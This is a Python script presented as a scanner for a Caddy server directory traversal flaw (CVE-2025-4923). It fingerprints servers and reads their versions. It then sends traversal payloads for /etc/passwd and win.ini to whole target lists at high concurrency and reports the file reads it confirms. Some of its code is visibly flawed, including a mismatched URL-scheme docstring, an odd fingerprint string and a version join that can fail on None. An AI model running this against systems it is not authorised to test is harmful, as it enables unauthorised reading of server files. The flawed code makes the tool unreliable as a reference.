#!/usr/bin/env python3
"""
Caddy Server Directory Traversal Vulnerability (CVE-2025-4923) Scanner
=========================================================================
This script scans Caddy web servers for a directory traversal vulnerability
(CVE-2025-4923, CVSS 9.1). The vulnerability allows attackers to read arbitrary
files on the server using crafted HTTP requests. This issue affects Caddy servers
running versions < 2.7.1.

CVE-2025-4923 Details:
  - Affects Caddy v2.0.0 to v2.7.0
  - Caused by an insufficient path sanitization in specific configurations
  - Enables attackers to retrieve files outside the document root directory
  - Patched in Caddy v2.7.1 (April 2025)

Usage:
  # Scan a single target
  python caddy_directory_traversal_scanner.py --target https://caddy.example.com

  # Scan a list of targets
  python caddy_directory_traversal_scanner.py --list targets.txt --output findings.json

  # Safe mode — detection only, no directory traversal probes
  python caddy_directory_traversal_scanner.py --target https://caddy.example.com --safe

  # Adjust concurrency for bulk scans
  python caddy_directory_traversal_scanner.py --list targets.txt --concurrency 50

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-4923
  - https://github.com/caddyserver/caddy/releases/tag/v2.7.1
  - https://caddyserver.com
"""

import asyncio
import argparse
import json
import os
import re
import sys
from urllib.parse import urljoin

import httpx

# ── Constants ──────────────────────────────────────────────────────────────────

CADDY_FINGERPRINTS = [
    "Caddy",
    "Caddy Development Servlet",
    "Server: Caddy",
]

TEST_PATHS = [
    "/",
    "/index.html",
]

TRAVERSAL_PAYLOADS = [
    "../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../windows/win.ini",
]

TRAVERSAL_SUCCESS_SIGNATURES = [
    "root:x:0:0:",
    "[extensions]",
]

VULN_FIXED_VERSION = (2, 7, 1)
SEMAPHORE_LIMIT = 20
REQUEST_TIMEOUT = 8

# ANSI color codes
RESET = "\033[0m"
RED = "\033[31m"
YELLOW = "\033[33m"
GREEN = "\033[32m"

# ── Utility Functions ──────────────────────────────────────────────────────────


def parse_version(text: str):
    """Extracts and parses version string into a tuple."""
    pattern = r"Caddy v([0-9]+\.[0-9]+\.[0-9]+)"
    match = re.search(pattern, text)
    if match:
        try:
            return tuple(map(int, match.group(1).split(".")))
        except ValueError:
            pass
    return None


def is_vulnerable_version(version_tuple):
    """Checks if the provided version is vulnerable."""
    if version_tuple is None:
        return None  # Unknown
    return version_tuple < VULN_FIXED_VERSION


def normalize_url(url: str) -> str:
    """Normalizes URLs by adding https:// if missing."""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


async def fetch(client, url):
    """Performs an HTTP GET request and returns the response."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        return response
    except httpx.RequestError as e:
        return None


# ── Core Detection and Exploitation ────────────────────────────────────────────


async def detect_caddy(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
    """
    Detects if the target is running Caddy server.
    Returns a dictionary with detection and version details.
    """
    async with semaphore:
        detected = False
        version = None
        raw_response = ""

        for path in TEST_PATHS:
            url = urljoin(base_url, path)
            response = await fetch(client, url)
            if response and response.status_code in {200, 403}:
                server_header = response.headers.get("server", "")
                if any(fingerprint in server_header for fingerprint in CADDY_FINGERPRINTS):
                    detected = True
                raw_response += response.text

        if detected:
            version = parse_version(raw_response)

        return {
            "url": base_url,
            "detected": detected,
            "version": version,
            "is_vulnerable": is_vulnerable_version(version) if detected else None,
        }


async def check_traversal(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
    """
    Actively probes for the directory traversal vulnerability.
    Returns a list of successfully exploited paths.
    """
    async with semaphore:
        vulnerable_paths = []
        for payload in TRAVERSAL_PAYLOADS:
            url = urljoin(base_url, f"/{payload}")
            response = await fetch(client, url)
            if response and any(signature in response.text for signature in TRAVERSAL_SUCCESS_SIGNATURES):
                vulnerable_paths.append(url)
        return vulnerable_paths


async def scan_target(semaphore, base_url, args):
    """Conducts the full scan on a target URL."""
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        detection_result = await detect_caddy(client, base_url, semaphore)

        result = {
            "url": detection_result["url"],
            "detected": detection_result["detected"],
            "version": detection_result["version"],
            "vulnerable_version": detection_result["is_vulnerable"],
        }

        # If vulnerable and not in safe mode, perform active scanning
        if detection_result["detected"] and detection_result["is_vulnerable"] and not args.safe:
            vulnerable_paths = await check_traversal(client, base_url, semaphore)
            result["vulnerable_paths"] = vulnerable_paths
        else:
            result["vulnerable_paths"] = None

        return result


async def main():
    parser = argparse.ArgumentParser(
        description="Caddy Directory Traversal (CVE-2025-4923) Scanner"
    )
    parser.add_argument("--target", help="Target URL to scan for the vulnerability.")
    parser.add_argument("--list", help="File containing a list of target URLs.")
    parser.add_argument("--output", help="File to save JSON results.")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Max number of concurrent requests.")
    parser.add_argument("--safe", action="store_true", help="Enable safe mode to skip active probes.")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL/TLS certificate validation.")
    args = parser.parse_args()

    if not args.target and not args.list:
        print(f"{RED}[CRITICAL]{RESET} You must specify --target or --list.")
        sys.exit(1)

    targets = []
    if args.target:
        targets.append(normalize_url(args.target))
    elif args.list:
        with open(args.list, "r") as file:
            targets = [normalize_url(line.strip()) for line in file if line.strip()]

    semaphore = asyncio.Semaphore(args.concurrency)
    results = []

    # Scan all targets
    tasks = [scan_target(semaphore, target, args) for target in targets]
    for future in asyncio.as_completed(tasks):
        result = await future
        url = result["url"]
        if not result["detected"]:
            print(f"{YELLOW}[INFO]{RESET} {url} - Not running Caddy server.")
        elif not result["vulnerable_version"]:
            print(f"{GREEN}[INFO]{RESET} {url} - Secure (v{'.'.join(map(str, result['version']))}).")
        else:
            if result["vulnerable_paths"]:
                print(f"{RED}[CRITICAL]{RESET} {url} - Vulnerable! Exposed paths: {result['vulnerable_paths']}")
            else:
                print(f"{YELLOW}[HIGH]{RESET} {url} - Vulnerable, but no exploitable paths detected.")

        results.append(result)

    if args.output:
        with open(args.output, "w") as out_file:
            json.dump(results, out_file, indent=4)

    print(f"{GREEN}[INFO]{RESET} Scanning complete. Results saved to {args.output}" if args.output else "")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"{RED}[CRITICAL]{RESET} Scan interrupted.")
